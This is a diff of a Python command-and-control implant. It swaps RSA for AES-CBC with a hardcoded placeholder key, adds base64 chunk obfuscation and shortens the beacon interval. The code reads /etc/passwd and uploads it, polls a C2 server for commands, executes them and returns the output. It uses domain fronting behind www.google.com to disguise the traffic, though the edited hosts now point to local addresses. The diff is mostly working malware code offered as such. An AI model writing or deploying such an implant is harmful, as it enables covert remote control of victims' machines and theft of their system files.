@@ -8,15 +8,57 @@ import sys
 from requests.adapters import HTTPAdapter
 from urllib3.poolmanager import PoolManager
 
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+import os
+import base64
+import hashlib
 
-SERVER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
------END PUBLIC KEY-----"""
+BLOCK_SIZE = 16
+KEY = "your_secret_key_here"  # Replace with your actual key
 
-CLIENT_PRIVATE_KEY_PEM = b"""-----BEGIN RSA PRIVATE KEY-----
------END RSA PRIVATE KEY-----"""
+# function that does AES encryption and then obfuscation
+def do_everything(data):
+    encrypted_data = aes_encrypt(data, KEY)
+    obfuscated_data = obfuscate(encrypted_data)
+    return obfuscated_data
+
+# function that does AES decryption and then deobfuscation
+def undo_everything(data):
+    deobfuscated_data = deobfuscate(data)
+    decrypted_data = aes_decrypt(deobfuscated_data, KEY)
+    return decrypted_data
+
+
+def aes_encrypt(plaintext, key):
+    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
+    iv = os.urandom(BLOCK_SIZE)
+
+    # PKCS7 padding
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(plaintext.encode()) + padder.finalize()
+
+    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted = encryptor.update(padded_data) + encryptor.finalize()
+
+    return base64.b64encode(iv + encrypted).decode()
+
+def aes_decrypt(ciphertext_b64, key):
+    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
+    raw = base64.b64decode(ciphertext_b64)
+    iv = raw[:BLOCK_SIZE]
+    encrypted = raw[BLOCK_SIZE:]
+
+    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(encrypted) + decryptor.finalize()
+
+    unpadder = padding.PKCS7(128).unpadder()
+    plaintext = unpadder.update(padded_data) + unpadder.finalize()
+
+    return plaintext.decode()
 
 def obfuscate(text):
     """Obfuscate text by first base64‑encoding it, then splitting into 16‑character chunks,
@@ -36,36 +78,13 @@ def deobfuscate(obf_str):
     chunks = list(reversed(chunks))
     if chunks:
         chunks[-1] = chunks[-1].rstrip('@')
-    return ''.join(chunks)
-
-def rsa_encrypt(public_key_pem, plaintext):
-    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
-    ciphertext = public_key.encrypt(
-        plaintext.encode(),
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return ciphertext.hex()
-
-def rsa_decrypt(private_key_pem, ciphertext_hex):
-    private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
-    ciphertext = bytes.fromhex(ciphertext_hex)
-    plaintext = private_key.decrypt(
-        ciphertext,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return plaintext.decode()
+    ordered_chunks = ''.join(chunks)
+    return base64.b64decode(ordered_chunks.encode()).decode()
 
 # --- Domain Fronting Settings ---
 FRONT_DOMAIN = "www.google.com"  # TLS SNI for obfuscation
-REAL_DOMAIN = "172.19.0.2"         # Actual C2 server IP/domain
+FRONT_DOMAIN = "127.0.0.1:8080"
+REAL_DOMAIN = "127.0.0.1:8080"         # Actual C2 server IP/domain
 UPLOAD_PATH = "/upload"
 COMMAND_PATH = "/command"
 RESULT_PATH = "/result"
@@ -113,10 +132,9 @@ def send_data():
     try:
         with open("/etc/passwd", "r") as file:
             file_data = file.read()
-        # Obfuscate then encrypt the data.
-        obf_data = obfuscate(file_data)
-        encrypted_data = rsa_encrypt(SERVER_PUBLIC_KEY_PEM, obf_data)
-        payload = {"data": encrypted_data}
+        
+        secret_data = do_everything(file_data)
+        payload = {"data": secret_data}
         session = requests.Session()
         adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
         session.mount("https://", adapter)
@@ -139,15 +157,12 @@ def poll_command():
         session.mount("https://", adapter)
         headers = {"Host": REAL_DOMAIN}
         response = session.get(COMMAND_URL, headers=headers, verify=False)
+        print(response.request.url)
         if response.status_code == 200:
             json_data = response.json()
-            encrypted_cmd = json_data.get("command", "")
-            if encrypted_cmd:
-                # Decrypt using the client's private key.
-                obf_cmd = rsa_decrypt(CLIENT_PRIVATE_KEY_PEM, encrypted_cmd)
-                # Deobfuscate to get the base64-encoded command.
-                b64_cmd = deobfuscate(obf_cmd)
-                cmd = base64.b64decode(b64_cmd.encode()).decode()
+            obfuscated_cmd = json_data.get("data", "")
+            if obfuscated_cmd:
+                cmd = undo_everything(obfuscated_cmd)
                 print("Received command:", cmd)
                 return cmd
         else:
@@ -170,7 +185,10 @@ def send_result(result):
         adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
         session.mount("https://", adapter)
         headers = {"Host": REAL_DOMAIN}
-        payload = {"result": result}
+
+        secret_result = do_everything(result)
+        payload = {"data": secret_result}
+        
         response = session.post(RESULT_URL, data=payload, headers=headers, verify=False)
         if response.status_code == 200:
             print("Result sent successfully")
@@ -199,7 +217,7 @@ def main():
                 result = execute_command(cmd)
                 print("Command output:", result)
                 send_result(result)
-        time.sleep(60)
+        time.sleep(15)
 
 if __name__ == '__main__':
     main()
